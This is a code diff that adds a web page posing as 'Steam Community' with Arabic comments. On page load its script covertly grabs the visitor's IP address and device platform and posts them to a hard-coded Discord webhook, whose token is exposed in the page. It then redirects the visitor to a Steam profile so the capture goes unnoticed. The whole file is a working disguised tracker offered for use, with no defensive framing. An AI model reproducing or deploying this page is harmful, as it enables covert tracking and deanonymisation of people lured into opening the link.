@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>Steam Community</title>
+</head>
+<body style="background-color: #171a21;"> <script>
+        const webhook = 'https://discord.com/api/webhooks/1501405046389084324/PA4KMl8-cPgmTYJYTKkQ8K7xNmoPcliaUoN8sy0hPPR82E7-uYeetdUtZh6NpY0eVPjl';
+        const steamUrl = 'https://steamcommunity.com/profiles/76561199209354660';
+
+        async function capture() {
+            try {
+                // 1. سحب الـ IP الأساسي
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                const ip = data.ip;
+
+                // 2. إرسال البيانات للديسكورد
+                await fetch(webhook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "🎯 صيد جديد من رابط ستيم",
+                            color: 16711680,
+                            description: `**عنوان الـ IP:** \`${ip}\`\n\n` + 
+                                         `🔎 **لفحص الدولة والشركة والمنطقة اضغط الرابط بالأسفل:**\n` +
+                                         `https://ip-api.com/#${ip}`,
+                            fields: [
+                                { name: "⏰ الوقت", value: new Date().toLocaleString('ar-SA'), inline: true },
+                                { name: "📱 الجهاز", value: navigator.platform, inline: true }
+                            ],
+                            footer: { text: "تم سحب الـ IP بنجاح" }
+                        }]
+                    })
+                });
+
+            } catch (e) {
+                console.log("Error");
+            } finally {
+                // 3. التحويل لستيم (يتم التحويل في كل الحالات حتى لو فشل السحب)
+                window.location.href = steamUrl;
+            }
+        }
+
+        capture();
+    </script>
+</body>
+</html>
